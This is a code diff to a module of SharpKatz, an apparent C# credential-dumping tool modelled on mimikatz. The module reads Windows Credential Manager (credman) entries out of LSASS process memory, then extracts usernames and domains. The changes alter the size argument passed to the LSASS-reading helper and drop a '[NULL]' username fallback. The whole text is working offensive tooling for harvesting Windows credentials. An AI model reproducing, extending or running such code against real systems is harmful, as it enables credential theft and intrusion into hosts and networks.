@@ -76,12 +76,12 @@ namespace SharpKatz.Module
 
                 //Console.WriteLine("[*] Credman  CredmanListSet found at address {0:X} {1:X}", luid.LowPart, credmanMem.ToInt64());
 
-                byte[] credmansetBytes = Utility.ReadFromLsass(ref hLsass, credmanMem, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_CREDMAN_SET_LIST_ENTRY))));
+                byte[] credmansetBytes = Utility.ReadFromLsass(ref hLsass, credmanMem, Marshal.SizeOf(typeof(KIWI_CREDMAN_SET_LIST_ENTRY)));
 
                 IntPtr pList1 = new IntPtr(BitConverter.ToInt64(credmansetBytes, Utility.FieldOffset<KIWI_CREDMAN_SET_LIST_ENTRY>("list1")));
                 IntPtr refer = IntPtr.Add(pList1, Utility.FieldOffset<KIWI_CREDMAN_LIST_STARTER>("start"));
 
-                byte[] credmanstarterBytes = Utility.ReadFromLsass(ref hLsass, pList1, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_STARTER))));
+                byte[] credmanstarterBytes = Utility.ReadFromLsass(ref hLsass, pList1, Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_STARTER)));
 
                 IntPtr pStart = new IntPtr(BitConverter.ToInt64(credmanstarterBytes, Utility.FieldOffset<KIWI_CREDMAN_LIST_STARTER>("start")));
 
@@ -96,7 +96,7 @@ namespace SharpKatz.Module
                 do
                 {
 
-                    byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Subtract(llCurrent, Utility.FieldOffset<KIWI_CREDMAN_LIST_ENTRY>("Flink") ), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_ENTRY))));
+                    byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Subtract(llCurrent, Utility.FieldOffset<KIWI_CREDMAN_LIST_ENTRY>("Flink") ), Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_ENTRY)));
                     KIWI_CREDMAN_LIST_ENTRY entry = Utility.ReadStruct<KIWI_CREDMAN_LIST_ENTRY>(entryBytes);
 
                     string username = Utility.ExtractUnicodeStringString(hLsass, entry.user);
@@ -124,14 +124,7 @@ namespace SharpKatz.Module
                     {
                         Credential.CredMan credmanentry = new Credential.CredMan();
                         credmanentry.Reference = reference;
-                        if (!string.IsNullOrEmpty(username))
-                        {
-                            credmanentry.UserName = username;
-                        }
-                        else
-                        {
-                            credmanentry.UserName = "[NULL]";
-                        }
+                        credmanentry.UserName = username;
 
                         if (!string.IsNullOrEmpty(domain))
                         {
